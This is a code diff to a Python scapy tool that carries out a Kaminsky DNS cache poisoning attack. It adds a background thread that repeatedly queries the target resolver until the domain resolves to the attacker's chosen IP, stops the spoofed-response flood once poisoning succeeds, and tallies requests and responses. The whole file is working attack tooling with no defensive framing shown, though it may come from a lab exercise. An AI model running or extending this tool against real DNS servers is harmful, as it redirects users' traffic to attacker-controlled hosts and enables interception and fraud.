@@ -13,6 +13,7 @@ from scapy.all import *
 import sys
 import os
 
+
 class KaminskyAttack:
     def __init__(self, target_ip, domain, num_requests, num_responses, num_tries, delay=0):
         self.target_ip = target_ip
@@ -26,7 +27,10 @@ class KaminskyAttack:
         self.cache_confirmed = False
         self.confirmation_received = threading.Event()
         self.attack_successful = False
-        
+        self.total_tries = 0
+        self.total_requests = 0
+        self.total_responses = 0
+
         # DNS server port
         self.dns_port = 53
         
@@ -111,6 +115,7 @@ class KaminskyAttack:
             # Send query
             print(f"[*] Sending query packet to {self.target_ip}:{self.dns_port}")
             send(query_packet, verbose=False)
+            self.total_requests += 1
             print(f"[*] Query sent successfully")
             
             # Test connectivity to DNS server first
@@ -127,18 +132,16 @@ class KaminskyAttack:
             
             # Send multiple spoofed responses with unique transaction IDs
             print(f"[*] Flooding {len(unique_ids)} responses for {subdomain}")
-            correct_id_sent = False
             
             for i, spoofed_id in enumerate(unique_ids):
+                # Check if attack should stop due to successful poisoning
+                if self.confirmation_received.is_set():
+                    print(f"[*] Stopping response flooding - cache poisoning detected!")
+                    break
+                    
                 response_packet = self.create_spoofed_response(subdomain, spoofed_id)
                 send(response_packet, verbose=False)
-                
-                # Log when we send the correct transaction ID
-                if spoofed_id == query_id:
-                    print(f"[!] Sending spoofed response with CORRECT ID: {spoofed_id}")
-                    print(f"[!] Response packet: {response_packet.summary()}")
-                    correct_id_sent = True
-                    break  # Stop flooding after sending correct ID
+                self.total_responses += 1
                 
                 # Progress indicator for large floods
                 if i % 10000 == 0 and i > 0:
@@ -147,53 +150,89 @@ class KaminskyAttack:
                 if self.delay > 0:
                     time.sleep(self.delay / 1000.0)
             
-            # If we sent the correct ID, wait and verify
-            if correct_id_sent:
-                print(f"[*] Correct transaction ID sent, waiting for DNS to process...")
-                time.sleep(2)  # Wait 2 seconds for DNS to process
-                
-                # Try to verify poisoning
-                if self.verify_poisoning(self.domain):
-                    print(f"[+] SUCCESS: DNS cache poisoned!")
-                    self.cache_confirmed = True
-                    self.confirmation_received.set()
-                    self.attack_successful = True
-                    return  # Exit this function
-                else:
-                    print(f"[-] DNS cache not poisoned, continuing attack...")
-            
             with self.lock:
                 self.attempt_count += 1
                 
         except Exception as e:
             print(f"[-] Error in send_query_and_responses: {e}")
     
+    def continuous_verification_worker(self):
+        """Continuously verify if DNS cache has been poisoned"""
+        print(f"[+] Starting continuous verification thread...")
+        verification_attempts = 0
+        
+        # Create a single verification query packet that we'll reuse
+        verification_query = IP(dst=self.target_ip) / UDP(sport=RandShort(), dport=53) / DNS(
+            rd=1, qd=DNSQR(qname=self.domain, qtype="A")
+        )
+        print(f"[+] Created verification query for {self.domain}")
+        
+        while not self.confirmation_received.is_set():
+            try:
+                # Send verification query and check response
+                response = sr1(verification_query, timeout=3, verbose=False)
+                verification_attempts += 1
+                
+                if response and response.haslayer(DNS):
+                    dns_layer = response[DNS]
+                    if dns_layer.an:
+                        for answer in dns_layer.an:
+                            if answer.type == 1:  # A record
+                                resolved_ip = answer.rdata
+                                
+                                if resolved_ip == self.malicious_ip:
+                                    print(f"\n[+] SUCCESS: DNS cache poisoning detected after {verification_attempts} verification attempts!")
+                                    print(f"[+] {self.domain} now resolves to {resolved_ip}")
+                                    self.cache_confirmed = True
+                                    self.confirmation_received.set()
+                                    self.attack_successful = True
+                                    return
+
+                if verification_attempts % 100 == 0:  # Print progress every 100 verifications
+                    print(f"[*] Verification attempts: {verification_attempts}")
+
+                # Wait before next verification
+                time.sleep(2)  # Check every 2 seconds
+                
+            except Exception as e:
+                print(f"[-] Error in continuous verification: {e}")
+                time.sleep(2)
+        
+        print(f"[+] Continuous verification thread stopped")
+
     def attack_worker(self):
         """Worker thread for sending attacks"""
-        requests_sent = 0
-        while requests_sent < self.num_requests and not self.confirmation_received.is_set():
+        while self.total_requests < self.num_requests and not self.confirmation_received.is_set():
             subdomain = self.generate_random_subdomain()
             self.send_query_and_responses(subdomain)
-            requests_sent += 1
-            
+
             # Check if we should continue
             if self.confirmation_received.is_set():
                 print(f"[+] Worker stopping due to confirmation received")
                 break
-                
-            if requests_sent % 100 == 0:
-                print(f"[*] Worker sent {requests_sent} requests...")
-    
+
+            if self.total_requests % 100 == 0:
+                print(f"[*] Worker sent {self.total_requests} requests...")
+
     def run_attack(self):
         """Run the main attack"""
         print(f"[+] Starting Kaminsky attack...")
         start_time = time.time()
         
-        # No confirmation listener needed - attacker will verify directly
+        # Start continuous verification thread
+        verification_thread = threading.Thread(target=self.continuous_verification_worker)
+        verification_thread.daemon = True
+        verification_thread.start()
+        print(f"[+] Started continuous verification thread")
         
         # Run multiple attack rounds
         for round_num in range(self.num_tries):
             print(f"[*] Starting attack round {round_num + 1}/{self.num_tries}")
+            
+            # Check if attack was already successful
+            if self.attack_successful:
+                print(f"[+] Attack successful, stopping all rounds")
+                break
             
             # Reset attempt count for this round
             self.attempt_count = 0
@@ -219,70 +258,86 @@ class KaminskyAttack:
                 for thread in threads:
                     thread.join()  # Wait indefinitely for threads to complete
             
+            self.total_tries += 1
             # Check if attack was successful
             if self.attack_successful:
                 print(f"[+] Attack successful, stopping all rounds")
                 break
             
             print(f"[*] Completed round {round_num + 1}: {self.attempt_count} requests sent")
-            
             # Wait between rounds
             if round_num < self.num_tries - 1:
                 print(f"[*] Waiting 5 seconds before next round...")
                 time.sleep(5)
         
+        # Wait for verification thread to finish
+        if verification_thread.is_alive():
+            self.confirmation_received.set()  # Signal verification thread to stop
+            verification_thread.join(timeout=5)
+        
         end_time = time.time()
         duration = end_time - start_time
         
         print(f"\n[+] Attack completed!")
-        print(f"[+] Total rounds: {self.num_tries}")
-        print(f"[+] Total requests sent: {self.num_tries * self.num_requests}")
-        print(f"[+] Total responses sent: {self.num_tries * self.num_requests * self.num_responses}")
+        print(f"[+] Total tries: {self.total_tries}")
+        print(f"[+] Total requests sent: {self.total_requests}")
+        print(f"[+] Total responses sent: {self.total_responses}")
         print(f"[+] Duration: {duration:.2f} seconds")
-        print(f"[+] Rate: {(self.num_tries * self.num_requests) / duration:.2f} requests/second")
+        print(f"[+] Rate: {(self.total_requests) / duration:.2f} requests/second")
         
-        return self.num_tries * self.num_requests
-    
-    def verify_poisoning(self, test_domain):
+        if self.attack_successful:
+            print(f"[+] ATTACK RESULT: SUCCESS - DNS cache was poisoned!")
+        else:
+            print(f"[-] ATTACK RESULT: FAILED - DNS cache was not poisoned")
+
+    def verify_poisoning(self, test_domain, verbose=False):
         """Verify if the DNS cache was poisoned"""
-        print(f"\n[+] Verifying DNS cache poisoning...")
+        if verbose:
+            print(f"\n[+] Verifying DNS cache poisoning...")
         
         try:
             # Create a test query
             test_query = IP(dst=self.target_ip) / UDP(sport=RandShort(), dport=53) / DNS(
                 rd=1, qd=DNSQR(qname=test_domain, qtype="A")
             )
-            print(f"[*] Verification query packet: {test_query.summary()}")
-            
-            print(f"[*] Sending verification query for {test_domain} to {self.target_ip}")
+            if verbose:
+                print(f"[*] Verification query packet: {test_query.summary()}")
+                print(f"[*] Sending verification query for {test_domain} to {self.target_ip}")
             # Send query and wait for response
             response = sr1(test_query, timeout=5, verbose=False)
             
             if response and response.haslayer(DNS):
                 dns_layer = response[DNS]
-                print(f"[+] Received DNS response: {dns_layer.summary()}")
+                if verbose:
+                    print(f"[+] Received DNS response: {dns_layer.summary()}")
                 if dns_layer.an:
                     for answer in dns_layer.an:
                         if answer.type == 1:  # A record
                             resolved_ip = answer.rdata
-                            print(f"[+] DNS resolution: {test_domain} -> {resolved_ip}")
+                            if verbose:
+                                print(f"[+] DNS resolution: {test_domain} -> {resolved_ip}")
                             
                             if resolved_ip == self.malicious_ip:
                                 print(f"[+] SUCCESS: DNS cache poisoned! {test_domain} resolves to {resolved_ip}")
                                 return True
                             else:
-                                print(f"[+] DNS cache not poisoned. {test_domain} resolves to {resolved_ip}")
+                                if verbose:
+                                    print(f"[+] DNS cache not poisoned. {test_domain} resolves to {resolved_ip}")
                                 return False
                 else:
-                    print(f"[-] No answer section in DNS response")
+                    if verbose:
+                        print(f"[-] No answer section in DNS response")
             else:
-                print(f"[-] No response received or no DNS layer")
+                if verbose:
+                    print(f"[-] No response received or no DNS layer")
             
-            print(f"[-] No DNS response received")
+            if verbose:
+                print(f"[-] No DNS response received")
             return False
             
         except Exception as e:
-            print(f"[-] Error verifying poisoning: {e}")
+            if verbose:
+                print(f"[-] Error verifying poisoning: {e}")
             return False
 
 def main():
@@ -320,7 +375,7 @@ def main():
     # Verify poisoning if requested
     if args.verify:
         test_domain = args.test_domain or f"www.{args.domain}"
-        attack.verify_poisoning(test_domain)
+        attack.verify_poisoning(test_domain, verbose=True)
 
 if __name__ == "__main__":
     main() 
